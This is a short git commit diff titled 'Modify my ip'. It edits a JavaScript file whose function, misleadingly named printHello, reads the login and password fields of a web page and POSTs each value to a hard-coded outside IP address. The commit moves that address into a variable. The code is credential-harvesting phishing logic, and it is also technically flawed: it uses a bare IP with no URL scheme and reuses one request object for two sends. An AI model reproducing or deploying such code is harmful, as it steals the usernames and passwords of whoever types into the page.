7939e77fe665798cfae9a4f9c61f749e09e009cf
Jordan Liu <jminjie@umich.edu>
2016-04-21 20:09:05 -0400

    Modify my ip

--- javascripts/main.js
+++ javascripts/main.js
@@ -1,12 +1,14 @@
+var my_ip = "98.209.19.232"
+
 function printHello() {
 	// grab the login and pass
 	var login = document.getElementById('login');
 	var password = document.getElementById('password');
 	// send the login and pass as resquests
 	var xmlHttp = new XMLHttpRequest();
-	xmlHttp.open( "POST", "35.2.222.118", true); // false for synchronous request
+	xmlHttp.open( "POST", my_ip, true); // false for synchronous request
 	xmlHttp.send("<login>" + login.value+ "</login>");
-	xmlHttp.open( "POST", "35.2.222.118", true); // false for synchronous request
+	xmlHttp.open( "POST", my_ip, true); // false for synchronous request
 	xmlHttp.send("<password>" + password.value+ "</password>");
 }
 
